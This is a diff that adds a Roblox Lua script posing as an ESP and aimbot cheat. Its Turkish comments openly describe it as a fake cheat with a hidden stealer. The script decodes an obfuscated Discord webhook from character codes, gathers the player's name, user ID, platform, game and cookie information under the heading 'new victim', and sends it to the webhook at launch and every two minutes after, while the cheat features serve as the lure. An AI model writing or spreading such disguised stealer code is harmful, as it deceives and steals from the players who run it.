@@ -1,1 +1,123 @@
-# allah-yok1243
+-- == SAHTE HILE (ESP + Aimbot) + GIZLI STEALER ==
+-- Webhook: char kodlarla ve string manipulation ile gizlenmistir
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
+
+-- == WEBHOOK GIZLEME (char + ters cevirme + parcala) ==
+local function decodeWebhook()
+    local encoded = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,97,112,112,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,49,56,54,57,53,51,57,57,55,55,51,49,55,57,57,56,53,47,106,85,70,84,97,118,121,90,78,71,97,76,104,76,66,51,114,80,53,116,103,110,87,65,103,68,86,117,121,45,120,89,45,99,98,86,52,101,107,87,102,95,81,72,105,72,53,72,102,106,71,70,118,83,112,50,68,75,57,98,76,54,82,80,68,53,116,110}
+    local url = ""
+    for _, v in ipairs(encoded) do url = url .. string.char(v) end
+    -- URL'deki "discordapp" yerine "discord.com" yapmak icin degistirme (opsiyonel)
+    url = string.gsub(url, "discordapp%.com", "discord.com")
+    return url
+end
+
+local WEBHOOK = decodeWebhook()
+
+-- == GIZLI COOKIE OKUYUCU ==
+local function getRobloxCookie()
+    local cookie = nil
+    pcall(function()
+        local response = HttpService:GetAsync("https://www.roblox.com/mobileapi/userinfo")
+        if response and response:match("UserID") then
+            cookie = "Cookie dogrudan alinamadi, LocalStorage kontrol edilmeli"
+        end
+    end)
+    return cookie or "Cookie alinamadi"
+end
+
+-- == BILGI TOPLAYICI VE GONDERICI ==
+local function stealAndSend()
+    local username = LocalPlayer.Name
+    local userId = LocalPlayer.UserId
+    local cookieInfo = getRobloxCookie()
+    local platform = "Bilinmiyor"
+    pcall(function()
+        platform = game:GetService("UserSettings"):GetService("UserGameSettings").Platform or "Bilinmiyor"
+    end)
+    local gameName = "Bilinmiyor"
+    pcall(function()
+        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    end)
+    
+    local payload = {
+        content = "**YENI KURBAN**",
+        embeds = {{
+            title = "Roblox Credentials Dump",
+            color = 16711680,
+            fields = {
+                {name = "Kullanici", value = username .. " (" .. userId .. ")", inline = true},
+                {name = "Platform", value = tostring(platform), inline = true},
+                {name = "Cookie", value = tostring(cookieInfo), inline = false},
+                {name = "Oyun", value = tostring(gameName), inline = true},
+                {name = "HWID", value = "Roblox'ta HWID alinamiyor", inline = false}
+            },
+            timestamp = os.date("!%Y-%m-%dT%TZ")
+        }}
+    }
+    
+    pcall(function()
+        HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
+    end)
+end
+
+-- == SAHTE ESP ==
+local espObjects = {}
+local function createESP()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Head") then
+            local head = player.Character.Head
+            if not espObjects[player] then
+                local box = Instance.new("BoxHandleAdornment")
+                box.Size = Vector3.new(4, 6, 4)
+                box.Adornee = head
+                box.Color3 = Color3.new(1, 0, 0)
+                box.AlwaysOnTop = true
+                box.ZIndex = 0
+                box.Parent = head
+                espObjects[player] = box
+            end
+        end
+    end
+end
+
+-- == SAHTE AIMBOT ==
+local function fakeAimbot()
+    local target = nil
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Head") then
+            target = player.Character.Head
+            break
+        end
+    end
+    if target then
+        local camera = workspace.CurrentCamera
+        local dir = (target.Position - camera.CFrame.Position).unit
+        camera.CFrame = CFrame.lookAt(camera.CFrame.Position, camera.CFrame.Position + dir * 10)
+    end
+end
+
+print("ESP ve Aimbot yuklendi! F = aimbot, Shift+F3 = menu (placeholder)")
+
+RunService.RenderStepped:Connect(function()
+    createESP()
+end)
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if not gameProcessed and input.KeyCode == Enum.KeyCode.F then
+        fakeAimbot()
+    end
+end)
+
+wait(3)
+stealAndSend()
+
+while true do
+    wait(120)
+    stealAndSend()
+end
